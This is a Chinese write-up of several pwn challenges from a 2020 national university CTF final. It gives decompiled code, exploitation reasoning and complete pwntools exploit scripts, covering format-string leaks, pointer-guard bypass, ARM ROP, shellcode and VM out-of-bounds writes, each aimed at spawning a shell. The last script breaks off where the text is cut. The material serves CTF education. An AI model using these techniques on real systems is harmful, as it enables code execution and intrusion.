@@ -1,0 +1,955 @@
+# 全国大学生信息安全竞赛决赛部分pwn题解
+
+阅读量 **283111**
+
+|评论 **2**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2020-10-19 16:30:55
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+## 前言
+
+比赛第一天为非典型性awd，第二天为解题赛，这里分析第一天的pwn3和第二天的题。
+
+## day1-pwn3
+
+###  程序逻辑
+
+主程序有一个死循环，每次启动一个新线程。线程函数里每次先将返回地址保存到bss处，之后调用gets读取栈变量，此处有溢出。而printf_chk函数是一个安全的格式化字符串函数，不可使用诸如`%k$p/%n`之类的格式化字符串。在使用`%p`泄露地址时，需要用连续的`%p`作为输入。
+
+    
+    
+    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+    {
+      pthread_t newthread; // [rsp+0h] [rbp-10h]
+      unsigned __int64 v4; // [rsp+8h] [rbp-8h]
+    
+      v4 = __readfsqword(0x28u);
+      setbuf(stdin, 0LL);
+      setbuf(_bss_start, 0LL);
+      setbuf(stderr, 0LL);
+      while ( 1 )
+      {
+        if ( pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, 0LL) == -1 )
+          puts("create thread failed");
+        pthread_join(newthread, 0LL);
+      }
+    }
+    //
+    unsigned __int64 __fastcall start_routine(void *a1)
+    {
+      char v2; // [rsp+0h] [rbp-40h]
+      unsigned __int64 v3; // [rsp+38h] [rbp-8h]
+      __int64 retaddr; // [rsp+48h] [rbp+8h]
+    
+      v3 = __readfsqword(0x28u);
+      ret_address = (__int64)&retaddr;
+      save_ret = retaddr;
+      gets(&v2);
+      __printf_chk(1LL, &v2);
+      *(_QWORD *)ret_address = save_ret;
+      return v3 - __readfsqword(0x28u);
+    }
+    
+
+###  漏洞利用
+
+由于在返回前子函数会将之前保存的地址再赋值给栈上对应位置处，因此溢出返回地址没有意义，比赛的时候我们通过fuzz发现输入`a*8*256`会造成crash，发现这里的rbx可控，进而可以控制rdi及rax，任意函数调用。
+
+![](https://p2.ssl.qhimg.com/t01adc5d0520f1d075a.png)
+
+![](https://p3.ssl.qhimg.com/t012d5c1c3be5e001d1.png)
+
+赛后去查了下源码，发现退出的函数位于`stdlib/cxa_thread_atexit_impl.c`，代码如下。`struct
+dtor_list`结构体的成员包含有`func`和`obj`，因此可以利用这个调用链，溢出到`cur`结构体，伪造func和obj，最后调用`system("/bin/sh")`。
+
+另外注意线程栈是mmap出来的，其和libc之间的偏移是固定的，我们可以通过leak libc地址间接得到输入地址。
+
+在最终调用func之前，还有一次`ror rax,0x11`和`xor rax,
+gs[0x30]`，需要leak出tls的`pointer_guard`成员。
+
+    
+    
+    * Call the destructors.  This is called either when a thread returns from the
+       initial function or when the process exits via the exit function.  */
+    void
+    __call_tls_dtors (void)
+    {
+      while (tls_dtor_list)
+        {
+          struct dtor_list *cur = tls_dtor_list;
+          dtor_func func = cur->func;
+    #ifdef PTR_DEMANGLE
+          PTR_DEMANGLE (func);
+    #endif
+    
+          tls_dtor_list = tls_dtor_list->next;
+          func (cur->obj);
+    
+          /* Ensure that the MAP dereference happens before
+         l_tls_dtor_count decrement.  That way, we protect this access from a
+         potential DSO unload in _dl_close_worker, which happens when
+         l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */
+          atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
+          free (cur);
+        }
+    }
+    /*
+    struct dtor_list
+    {
+      dtor_func func;
+      void *obj;
+      struct link_map *map;
+      struct dtor_list *next;
+    };
+    */
+    
+
+###  exp.py
+
+    
+    
+    #coding:utf-8
+    
+    from pwn import *
+    import sys,os,string
+    
+    elf_path = './pwn'
+    remote_libc_path = ''
+    
+    #P = ELF(elf_path)
+    context(os='linux',arch='amd64')
+    context.terminal = ['tmux','split','-h']
+    #context.terminal = ['tmux','split','-h']
+    context.log_level = 'debug'
+    
+    local = 1
+    if local == 1:
+        p = process(elf_path)
+        if context.arch == 'amd64':
+            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+        else:
+            libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+    else:
+        p = remote()
+        #libc = ELF(remote_libc_path)
+    
+    
+    def ROL(data, shift, size=64):
+        shift %= size
+        remains = data >> (size - shift)
+        body = (data << shift) - (remains << size )
+        return (body + remains)
+    
+    
+    def ROR(data, shift, size=64):
+        shift %= size
+        body = data >> shift
+        remains = (data << (size - shift)) - (body << size)
+        return (body + remains)
+    
+    
+    payload = '%p'*13
+    sleep(0.1)
+    #raw_input()
+    p.sendline(payload)
+    p.recvn(14)
+    libcbase = int(p.recv(14),16)-libc.sym['_IO_2_1_stdin_']
+    log.success('libcbase = '+hex(libcbase))
+    p.recvuntil('7000x')
+    p.recvuntil('7000x')
+    canary = int(p.recv(16),16)
+    log.success('canary = '+hex(canary))
+    
+    #gdb.attach(p)
+    gadgets = [0x4f2c5,0x4f322,0x10a38c]
+    shell_addr = libcbase + gadgets[0]
+    #tls_addr = libcbase - 0x900 + 0x30
+    tls_addr = libcbase + 0x816740 + 0x30
+    print hex(tls_addr)
+    fake_addr= 0x12345678
+    print hex(shell_addr)
+    payload = "%p"*6+"%s"+"%s"+p64(tls_addr)+p64(libcbase+libc.sym['environ'])
+    #payload = 'a'*0x38+p64(canary)+p64(0xdeadbeef)+'a'*8*240+p64(fake_addr)
+    #payload = payload.ljust(0x500,'a')
+    #gdb.attach(p,'''
+    #            b *(0x555555554000+0x11E0)
+    #            b *(0x555555554000+0x128E)
+    #            ''')
+    #raw_input()
+    sleep(0.1)
+    p.sendline(payload)
+    p.recvuntil("0x7325732570257025")
+    guard = u64(p.recvn(8))
+    log.success("fs 0x30 guard " + hex(guard))
+    stack_addr = u64(p.recvn(6).ljust(8,'\x00'))
+    log.success("stack addr => " + hex(stack_addr))
+    input_addr = libcbase - 0x1150
+    #get shell
+    #raw_input()
+    sleep(0.1)
+    p.sendline(payload)
+    #system_enc = circular_shift_left(libcbase+libc.sym['system'],0x11,64)
+    system_enc = (libcbase+libc.sym['system']) ^ guard
+    system_enc = ROL(system_enc,0x11)
+    
+    payload = p64(system_enc)+p64(libcbase+libc.search("/bin/sh").next())
+    payload += '\x00'*0x28
+    payload += p64(canary)
+    payload += p64(0xdeadbeef)
+    payload += p64(input_addr)*246
+    payload += p64(input_addr)
+    sleep(0.1)
+    #raw_input()
+    p.sendline(payload)
+    p.interactive()
+    
+
+## day2-pwn1
+
+###  程序逻辑
+
+基础的栈溢出，arm32架构
+
+    
+    
+    int __cdecl main(int argc, const char **argv, const char **envp)
+    {
+      char buf; // [sp+0h] [bp-104h]
+    
+      setvbuf((FILE *)stdout, 0, 2, 0);
+      printf("input: ");
+      read(0, &buf, 0x300u);
+      return 0;
+    }
+    
+
+###  漏洞利用
+
+程序的gadget很少，arm调用的前四个参数寄存器是r0-r4，这里看到只有r3/r4可控.
+
+    
+    
+    ─wz@wz-virtual-machine ~/Desktop/CTF/ciscn_final/day2/pwn1pm ‹hexo*› 
+    ╰─$ file ./bin 
+    ./bin: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, not stripped
+    ╭─wz@wz-virtual-machine ~/Desktop/CTF/ciscn_final/day2/pwn1pm ‹hexo*› 
+    ╰─$ checksec ./bin
+    [*] '/home/wz/Desktop/CTF/ciscn_final/day2/pwn1pm/bin'
+        Arch:     arm-32-little
+        RELRO:    Partial RELRO
+        Stack:    No canary found
+        NX:       NX enabled
+    ╭─wz@wz-virtual-machine ~/Desktop/CTF/ciscn_final/day2/pwn1pm ‹hexo*› 
+    ╰─$ ROPgadget --binary ./bin --only 'pop'                                                                                               1 ↵
+    Gadgets information
+    ============================================================
+    0x00010348 : pop {r3, pc}
+    0x00010498 : pop {r4, pc}
+    
+    Unique gadgets found: 2
+    
+
+查看一下汇编，发现这里的r0、r1都可以间接控制，从而任意函数调用。
+
+![](https://p2.ssl.qhimg.com/t01ff97afcd89481205.png)
+
+###  漏洞利用
+
+这里有两种思路，第一种是劫持返回地址到printf前的地址，通过最后的`pop {fp,
+pc}`控制fp为bss地址，pc到pop_r3_pc来劫持r3为printf[@got](https://github.com/got
+"@got")，再去执行printf泄露libc地址，最后read溢出执行`system("/bin/sh")`。
+
+另一种是利用qemu-arm启动时的特性，NX保护实际上并没有开启，bss段可执行，第一次溢出栈迁移到bss，并部署好shellcode，第二次跳到对应位置执行shellcode。
+
+###  rop.py
+
+    
+    
+    #coding=utf-8
+    from pwn import *
+    
+    r = lambda p:p.recv()
+    rl = lambda p:p.recvline()
+    ru = lambda p,x:p.recvuntil(x)
+    rn = lambda p,x:p.recvn(x)
+    rud = lambda p,x:p.recvuntil(x,drop=True)
+    s = lambda p,x:p.send(x)
+    sl = lambda p,x:p.sendline(x)
+    sla = lambda p,x,y:p.sendlineafter(x,y)
+    sa = lambda p,x,y:p.sendafter(x,y)
+    
+    context.update(arch='arm',os='linux',log_level='DEBUG')
+    context.terminal = ['tmux','split','-h']
+    debug = 1
+    elf = ELF('./bin')
+    libc_offset = 0x3c4b20
+    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
+    libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6')
+    if debug == 1:
+        p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./bin"])
+    elif debug == 2:
+        p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./bin"])
+    
+    p_r3_pc = 0x00010348
+    
+    def exp():
+        #leak libc
+        bss = elf.bss()+0x500
+        sc = asm(shellcraft.sh())
+        payload = 'a'*0x100
+        payload += p32(bss+0x104)
+        payload += p32(p_r3_pc)
+        payload += p32(elf.got['printf'])
+        payload += p32(0x104d8)
+        p.recvuntil("input: ")
+        raw_input()
+        p.sendline(payload)
+        libc_base = u32(p.recvn(4)) - libc.sym['printf']
+        log.success("libc base => " + hex(libc_base))
+        raw_input()
+        p_r0_r = libc_base + 0x00056b7c
+        payload = sc
+        payload = payload.ljust(0x100,'\x00')
+        payload += p32(bss+4)
+        payload += p32(p_r0_r)
+        payload += p32(libc_base+0x000ca574)+p32(0)
+        payload += p32(libc_base+libc.sym['system'])
+        p.sendline(payload)
+        p.interactive()
+    
+    exp()
+    
+
+###  sc.py
+
+    
+    
+    #coding=utf-8
+    from pwn import *
+    
+    r = lambda p:p.recv()
+    rl = lambda p:p.recvline()
+    ru = lambda p,x:p.recvuntil(x)
+    rn = lambda p,x:p.recvn(x)
+    rud = lambda p,x:p.recvuntil(x,drop=True)
+    s = lambda p,x:p.send(x)
+    sl = lambda p,x:p.sendline(x)
+    sla = lambda p,x,y:p.sendlineafter(x,y)
+    sa = lambda p,x,y:p.sendafter(x,y)
+    
+    context.update(arch='arm',os='linux',log_level='DEBUG')
+    context.terminal = ['tmux','split','-h']
+    debug = 1
+    elf = ELF('./bin')
+    libc_offset = 0x3c4b20
+    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
+    libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6')
+    if debug == 1:
+        p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./bin"])
+    elif debug == 2:
+        p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./bin"])
+    
+    p_r3_pc = 0x00010348
+    
+    def exp():
+        #leak libc
+        bss = elf.bss()+0x500
+        sc = asm(shellcraft.sh())
+        payload = 'a'*0x100
+        payload += p32(bss+0x104)
+        payload += p32(p_r3_pc)
+        payload += p32(bss)
+        payload += p32(0x104e4)
+        raw_input()
+        p.sendline(payload)
+        raw_input()
+        payload = sc
+        payload = payload.ljust(0x100,'\x00')
+        payload += p32(bss+4)
+        payload += p32(bss)
+        p.sendline(payload)
+        p.interactive()
+    
+    exp()
+    
+
+## day2-pwn2
+
+###  程序逻辑
+
+VMPwn类型的题目，程序没有开PIE。
+
+在主要函数里的0xe指令可以控制`*(_QWORD *)(8 * ((unsigned
+__int64)node_addr->stack_sz_divie_2 >> 3) +
+node_addr->stack_addr)`为任意值，结合0x2指令可以实现地址越界写，0x1指令可以实现地址越界读。但是越界只能往高地址越界读写。
+
+    
+    
+    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
+    {
+      unsigned __int64 i; // [rsp+0h] [rbp-30h]
+      node *node_addr; // [rsp+8h] [rbp-28h]
+      unsigned __int64 nmemb; // [rsp+10h] [rbp-20h]
+      unsigned __int64 nbytes; // [rsp+18h] [rbp-18h]
+      unsigned __int64 code_sz; // [rsp+20h] [rbp-10h]
+    
+      node_addr = (node *)calloc(0x40uLL, 1uLL);
+      printf("stack size >", 1LL);
+      nmemb = read_int();
+      if ( nmemb > 0xFFFFF || nmemb <= 0xFFF || nmemb & 0xFFF )
+      {
+        puts("invalid stack size!");
+        exit(0);
+      }
+      node_addr->stack_sz = nmemb;
+      node_addr->stack_sz_divie_2 = nmemb >> 1;
+      node_addr->stack_addr = (__int64)calloc(nmemb, 1uLL);
+      if ( !node_addr->stack_addr )
+        exit(-1);
+      printf("data size >", 1LL);
+      nbytes = read_int();
+      if ( nbytes > 0xFFFFF || nbytes <= 0xFFF || nbytes & 0xFFF )
+      {
+        puts("invalid data size!");
+        exit(0);
+      }
+      node_addr->data_sz = nbytes;
+      node_addr->data_addr = (__int64)calloc(nbytes, 1uLL);
+      if ( !node_addr->data_addr )
+        exit(-1);
+      printf("initial data >", 1LL);
+      read(0, (void *)node_addr->data_addr, nbytes);
+      printf("code size >");
+      code_sz = read_int();
+      if ( code_sz > 0xFFFFF || code_sz <= 0xFFF || code_sz & 0xFFF )
+      {
+        puts("invalid code size!");
+        exit(0);
+      }
+      node_addr->code_sz = code_sz;
+      node_addr->code_addr = (__int64)calloc(code_sz, 1uLL);
+      node_addr->_rip = 0LL;
+      if ( !node_addr->code_addr )
+        exit(-1);
+      printf("initial code >", 1LL);
+      read(0, (void *)node_addr->code_addr, code_sz);
+      for ( i = 0LL; i <= 0x7FF && !(unsigned int)main_func(node_addr); ++i )
+        ;
+      printf("data: ");
+      write(1, (const void *)node_addr->data_addr, node_addr->data_sz);
+      puts(&byte_40179C);
+      return 0LL;
+    }
+    //
+    signed __int64 __fastcall main_func(node *node_addr)
+    {
+      signed __int64 result; // rax
+      __int64 v2; // ST20_8
+      __int64 v3; // ST20_8
+      __int64 v4; // ST20_8
+      __int64 v5; // ST20_8
+      __int64 v6; // ST20_8
+      __int64 v7; // ST20_8
+      __int64 v8; // ST20_8
+      __int64 v9; // ST20_8
+      __int64 v10; // ST20_8
+      __int64 v11; // ST20_8
+    
+      if ( node_addr->_rip > (unsigned __int64)(node_addr->code_sz - 1)
+        || node_addr->stack_sz_divie_2 > (unsigned __int64)(node_addr->stack_sz - 8) )
+      {
+        return 0xFFFFFFFFLL;
+      }
+      switch ( *(unsigned __int8 *)(node_addr->code_addr + node_addr->_rip) )
+      {
+        case 0u:
+          result = 0xFFFFFFFFLL;
+          break;
+        case 1u:
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 8) )// arb read
+          {
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = *(_QWORD *)(8LL * (*(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3)) >> 3) + node_addr->data_addr);
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 2u:                                    // mov
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            *(_QWORD *)(node_addr->data_addr
+                      + 8LL
+                      * (*(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3)) >> 3)) = *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 0x10LL;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 3u:                                    // add
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            v2 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3))
+               + *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v2;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 4u:                                    // sub
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            v3 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3))
+               - *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v3;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 5u:                                    // *
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            v4 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3))
+               * *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v4;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 6u:                                    // /
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            if ( *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1)) )
+            {
+              v5 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3))
+                 / *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+              node_addr->stack_sz_divie_2 += 8LL;
+              *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v5;
+              goto LABEL_56;
+            }
+            result = 0xFFFFFFFFLL;
+          }
+          else
+          {
+            result = 0xFFFFFFFFLL;
+          }
+          break;
+        case 7u:                                    // %
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            if ( *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1)) )
+            {
+              v6 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3))
+                 % *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+              node_addr->stack_sz_divie_2 += 8LL;
+              *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v6;
+              goto LABEL_56;
+            }
+            result = 0xFFFFFFFFLL;
+          }
+          else
+          {
+            result = 0xFFFFFFFFLL;
+          }
+          break;
+        case 8u:                                    // &
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            v7 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3)) & *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v7;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 9u:                                    // |
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            v8 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3)) | *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v8;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 0xAu:                                  // ^
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            v9 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3)) ^ *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v9;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 0xBu:                                  // ~
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 8) )
+          {
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = ~*(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3));
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 0xCu:                                  // <<
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            v10 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3)) << *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v10;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 0xDu:                                  // >>
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 16) )
+          {
+            v11 = *(_QWORD *)(node_addr->stack_addr + 8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3)) >> *(_QWORD *)(node_addr->stack_addr + 8 * (((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + 1));
+            node_addr->stack_sz_divie_2 += 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = v11;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 0xEu:
+          if ( node_addr->stack_sz_divie_2 > 7uLL ) // 可控
+          {
+            node_addr->stack_sz_divie_2 -= 8LL;
+            *(_QWORD *)(8 * ((unsigned __int64)node_addr->stack_sz_divie_2 >> 3) + node_addr->stack_addr) = *(_QWORD *)(node_addr->code_addr + node_addr->_rip + 1);
+            node_addr->_rip += 8LL;
+            goto LABEL_56;
+          }
+          result = 0xFFFFFFFFLL;
+          break;
+        case 0xFu:                                  // add pointer
+          if ( node_addr->stack_sz_divie_2 <= (unsigned __int64)(node_addr->stack_sz - 8) )
+          {
+            node_addr->stack_sz_divie_2 += 8LL;
+    LABEL_56:
+            ++node_addr->_rip;
+            result = 0LL;
+          }
+          else
+          {
+            result = 0xFFFFFFFFLL;
+          }
+          break;
+        default:
+          result = 0xFFFFFFFFLL;
+          break;
+      }
+      return result;
+    }
+    
+
+###  漏洞利用
+
+当分配大小大于等于0x23000时会触发mmap，测试发现这里的map地址刚好在ld.so可写区域上方，偏移固定。而`_rtld_global+3848`处有一函数指针在函数退出时会被调用，参数为`_rtld_global+2312`，通过越界读写配合add/sub指令布置system函数指针及`/bin/sh`字符串，最终在函数退出时调用`system("/bin/sh")`
+
+###  exp.py
+
+    
+    
+    #coding=utf-8
+    from pwn import *
+    
+    r = lambda p:p.recv()
+    rl = lambda p:p.recvline()
+    ru = lambda p,x:p.recvuntil(x)
+    rn = lambda p,x:p.recvn(x)
+    rud = lambda p,x:p.recvuntil(x,drop=True)
+    s = lambda p,x:p.send(x)
+    sl = lambda p,x:p.sendline(x)
+    sla = lambda p,x,y:p.sendlineafter(x,y)
+    sa = lambda p,x,y:p.sendafter(x,y)
+    
+    context.update(arch='amd64',os='linux',log_level='DEBUG')
+    context.terminal = ['tmux','split','-h']
+    debug = 2
+    elf = ELF('./StackMachine')
+    libc_offset = 0x3c4b20
+    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
+    if debug:
+        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+        p = process('./StackMachine')
+    elif debug == 2:
+        libc = ELF('./libc.so.6')
+        p = process('./StackMachine',env={'LD_PRELOAD':'./libc.so.6'})
+    else:
+        libc = ELF('./libc.so.6')
+        p = remote('f.buuoj.cn',20173)
+    
+    def AllocStack(sz):
+        p.sendlineafter("stack size >",str(sz))
+    
+    def AllocData(sz,data):
+        p.sendlineafter("data size >",str(sz))
+        p.recvuntil("initial data >")
+        p.sendline(data)
+    
+    def AllocCode(sz,code):
+        p.sendlineafter("code size >",str(sz))
+        p.recvuntil("tial code >")
+        p.sendline(code)
+    
+    def exp():
+        #leak libc
+        AllocStack(0xff000)
+        main_addr = 0x401346
+        offset = 0
+        gdb.attach(p,'b *0x400b9e\nb* 0x400a7a')
+        AllocData(0x23000,p64(0x3858f0)+"/bin/sh\x00")
+        payload = p8(0xe)+p64(0)
+        payload += p8(1)
+        payload += p8(0xe)+p64(0x14af38)
+        payload += p8(1)
+        payload += p8(4)
+        payload += p8(0xe)+p64(0x14af38)
+        payload += p8(2)
+        payload += p8(0xe)+"/bin/sh\x00"
+        payload += p8(0xe)+p64(0x14af38-0x600)
+        payload += p8(2)
+        #payload += p8(0xe)+p64(main_addr)
+        #payload += p8(0xe)+p64(0x23000-8)
+        #payload += p8(2)
+        #payload += p8(0xe)+p64(main_addr)
+    
+        AllocCode(0x1000,payload)
+        p.interactive()
+    
+    exp()
+    
+
+## pwn3
+
+###  程序逻辑
+
+逻辑和2019年d3ctf的unprintableV一模一样，不一样的是这里的bss上的stdout对应位置不可写。不可以用之前方式先修改bss的stdout.fileno为2，再leak和write
+rops。
+
+    
+    
+    int main_func_0()
+    {
+      int result; // eax
+      char *v1; // [rsp+8h] [rbp-8h]
+    
+      v1 = s1;
+      puts("Oh! I hear you love Ciscn2020, so I have a gift for you!");
+      printf("Gift: %p\n", &v1);
+      puts("Come in quickly, I will close the door.");
+      close(1);
+      while ( 1 )
+      {
+        result = strncmp(s1, "Ciscn20", 7uLL);
+        if ( !result )
+          break;
+        main_func();
+      }
+      return result;
+    }
+    //
+    int main_func()
+    {
+      get_input(s1, 0x120LL);
+      return printf(s1, 0x120LL);
+    }
+    
+
+###  漏洞利用
+
+通过测试发现栈上残存了一些stdout指针，不过因为其位置位于printf字符串寻址的低地址处，无法控制，修改printf返回地址或者main_func返回地址的低字节到start函数，在__libc_start_main调用的时候会大幅度减栈，使得这些stdout指针转移到新的printf函数栈帧高地址处，从而可以覆写其fileno为2来重新输出内容。
+
+在之后在栈上布置`pop rsp`及`input_addr`，触发时栈迁移到bss来执行rop读取flag。
+
+###  exp.py
+
+由于写入字节数不可大于0x2000，所以要爆破栈地址3/16，proc_base地址1/2字节，概率大概是1/(16*16/3)。
+
+    
+    
+    #coding=utf-8
+    from pwn import *
+    
+    r = lambda p:p.recv()
+    rl = lambda p:p.recvline()
+    ru = lambda p,x:p.recvuntil(x)
+    rn = lambda p,x:p.recvn(x)
+    rud = lambda p,x:p.recvuntil(x,drop=True)
+    s = lambda p,x:p.send(x)
+    sl = lambda p,x:p.sendline(x)
+    sla = lambda p,x,y:p.sendlineafter(x,y)
+    sa = lambda p,x,y:p.sendafter(x,y)
+    
+    context.update(arch='amd64',os='linux',log_level='info')
+    context.terminal = ['tmux','split','-h']
+    debug = 1
+    elf = ELF('./anti.bak')
+    libc_offset = 0x3c4b20
+    gadgets = [0x45226,0x4527a,0xcd173,0xcd248,0xf0364,0xf0370,0xf1207,0xf67b0]
+    
+    #p = process('./anti.bak')
+    def WriteVal(stack_low,off,val,signle=False):
+        payload = "%"+str(stack_low+off)+"c%6$hn"
+        sleep(0.02)
+        p.sendline(payload)
+        if not signle:
+            payload = "%"+str(val)+"c%10$hn"
+        else:
+            payload = "%"+str(val)+"c%10$hhn"
+        sleep(0.02)
+        p.sendline(payload)
+    
+    
+    def exp():
+        #leak stack
+        p.recvuntil("Oh! I hear you love Ciscn2020, so I have a gift for you!")
+        p.recvuntil("Gift: 0x")
+        stack_addr = int(p.recvline().strip('\n'),16)
+        log.success("stack addr => " + hex(stack_addr))
+        #for item in gadgets:
+        #    print hex(0x7ffff7a0d000+item)
+        sleep(0.02)
+        stack_low = stack_addr & 0xffff
+        if stack_low > 0x2000:
+            return 0
+        stack_low_1 = stack_addr & 0xff
